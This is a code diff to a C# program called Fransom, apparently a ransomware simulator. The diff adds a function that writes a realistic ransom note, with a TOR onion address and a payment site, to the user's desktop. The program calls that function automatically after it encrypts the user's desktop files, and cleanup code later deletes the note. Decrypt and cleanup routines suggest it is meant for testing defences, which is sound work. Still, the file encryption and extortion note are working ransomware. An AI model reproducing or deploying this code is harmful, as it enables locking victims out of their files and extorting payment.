@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Diagnostics;
@@ -29,6 +29,8 @@ namespace Fransom
 
         class Options
         {
+            [Option("ransomnote", HelpText = "Create a ransomnote on the user's desktop.", Group = "arguments")]
+            public bool RansomNote { get; set; }
             [Option("enumerate-user-profile", HelpText = "List all files and folders under the current user profile.", Group = "arguments")]
             public bool EnumerateUserProfile { get; set; }
             [Option("encrypt-user-profile", HelpText = "Encrypt all files (recursively) under the current user profile.", Group = "arguments")]
@@ -137,6 +139,7 @@ namespace Fransom
         static void DisplayHelpShell()
         {
             Logger.WriteLine("");
+            Logger.WriteLine("ransomnote\t\t\tCreate a ransom note on the user's desktop.");
             Logger.WriteLine("enumerate-user-profile\t\t\tList all files and folders under the current user profile.");
             Logger.WriteLine("encrypt-user-profile\t\t\tEncrypt all files (recursively) under the current user profile.");
             Logger.WriteLine("decrypt-user-profile\t\t\tDecrypt all encrypted files (recursively) under the current user profile.");
@@ -199,6 +202,69 @@ namespace Fransom
              .WithNotParsed(errs => DisplayHelp(parserResult, errs));
         }
 
+        public static void RansomNote()
+        {
+            // Get the path to the desktop
+            string message = "Attention!\n" +
+                              "\n" +
+                              "----------------------------\n" +
+                              "| What happened?\n" +
+                              "----------------------------\n" +
+                              "All your files, documents, photos, databases, and other important data are safely encrypted with reliable algorithms.\n" +
+                              "You cannot access the files right now. But do not worry. You have a chance! It is easy to recover in a few steps." +
+                              "\n" +
+                              "----------------------------\n" +
+                              "| How to get my files back?\n" +
+                              "----------------------------\n" +
+                              "\n" +
+                              "The only method to restore your files is to purchase a unique for you private key which is securely stored on our servers.\n" +
+                              "To contact us and purchase the key you have to visit our website in a hidden TOR network.\n" +
+                              "\n" +
+                              "There are general 2 ways to reach us:\n" +
+                              "\n" +
+                              "1) [Recommended] Using hidden TOR network.\n" +
+                              "\n" +
+                              "  a) Download a special TOR browser: https://www.torproject.org/\n" +
+                              "  b) Install the TOR Browser.\n" +
+                              "  c) Open the TOR Browser.\n" +
+                              "  d) Open our website in the TOR browser: http://aoacugmutagkwctu.onion/aloiwuerufd\n" +
+                              "  e) Follow the instructions on this page.\n" +
+                              "\n"+
+                              "2) If you have any problems connecting or using TOR network\n" +
+                              "\n"+
+                              "  a) Open our website: https://FRANSOMdecrypt.top/werqsdfewrt\n" +
+                              "  b) Follow the instructions on this page.\n" +
+                              "\n" +
+                              "Warning: the second (2) method can be blocked in some countries. That is why the first (1) method is recommended to use.\n" +
+                              "\n" +
+                              "On this page, you will see instructions on how to make a free decryption test and how to pay.\n" +
+                              "Also it has a live chat with our operators and support team.\n" +
+                              "\n" +
+                              "----------------------------\n" +
+                              "| What about guarantees?\n" +
+                              "----------------------------\n" +
+                              "\n" +
+                              "We understand your stress and worry.\n" +
+                              "So you have a FREE opportunity to test a service by instantly decrypting for free three files on your computer!\n" +
+                              "If you have any problems our friendly support team is always here to assist you in a live chat!\n" +
+                              "\n" +
+                              "\n" +
+                              "-------------------------------------------------------------------------------\n" +
+                              "THIS IS A SPECIAL BLOCK WITH A PERSONAL AND CONFIDENTIAL INFORMATION! DO NOT TOUCH IT WE NEED IT TO IDENTIFY AND AUTHORIZE YOU\n" +
+                              "---BEGIN FRANSOM KEY---\n" +
+                              "[snip]\n" +
+                              "---END FRANSOM KEY---\n";
+            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+            // Combine the desktop path with the filename to create the full path
+            string filePath = Path.Combine(desktopPath, "youHavebeenPwnd.txt");
+
+            // Write "hello world!" to the file, creating it if it doesn't exist
+            File.WriteAllText(filePath, message);
+
+            Console.WriteLine($"Ransom note has been created at: {filePath}");
+        }
+
         static void DisplayHelp<T>(ParserResult<T> result, IEnumerable<Error> errs)
         {
             var helpText = HelpText.AutoBuild(result, h =>
@@ -214,7 +280,11 @@ namespace Fransom
         static void Run(Options options)
         {
             var pr = new Program();
-            if (options.EnumerateUserProfile)
+            if (options.RansomNote)
+            {
+                RansomNote();
+            }
+            else if (options.EnumerateUserProfile)
             {
                 pr.EnumerateUserProfile();
             }
@@ -1176,7 +1246,7 @@ namespace Fransom
             }
         }
 
-        public void EncryptUserProfile()
+          public void EncryptUserProfile()
         {
             StringCollection stringCollection = new StringCollection();
             EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop"), "*.*", true);
@@ -1190,6 +1260,7 @@ namespace Fransom
                 string enc_file = file_name + ".FRANSOM";
                 EncryptFile(file_name, enc_file, password);
             }
+            RansomNote();
         }
 
         private static void DecryptUserProfile()
@@ -1205,14 +1276,16 @@ namespace Fransom
                 string file_path = @file_name;
                 if (Path.GetExtension(file_path) == ".FRANSOM")
                 {
-                    Logger.WriteLine("Decrypting object: " + file_name, SensitiveData);
+                 Logger.WriteLine("Decrypting object: " + file_name, SensitiveData);
                     string dec_file = Path.GetDirectoryName(file_name) + "\\" + Path.GetFileNameWithoutExtension(file_name);
                     DecryptFile(file_name, dec_file.ToString(), password);
                 }
             }
+           
         }
 
-        private static void CleanupUserProfile()
+
+    private static void CleanupUserProfile()
         {
 
             string folder_path = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop\\") + "Fransom";
@@ -1244,6 +1317,21 @@ namespace Fransom
                 catch (Exception e)
                 {
                     Logger.WriteLine("[-] Error: " + e.Message);
+                }
+            }
+            
+            // Delete the ransomnote
+            string targetFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "youHavebeenPwnd.txt");
+            if (File.Exists(targetFilePath))
+            {
+                try
+                {
+                    File.Delete(targetFilePath);
+                    Logger.WriteLine("Successfully deleted the file: youHavebeenPwnd.txt", SensitiveData);
+                }
+                catch (Exception ex)
+                {
+                    Logger.WriteLine("Failed to delete the file: youHavebeenPwnd.txt. Error: " + ex.Message, SensitiveData);
                 }
             }
         }
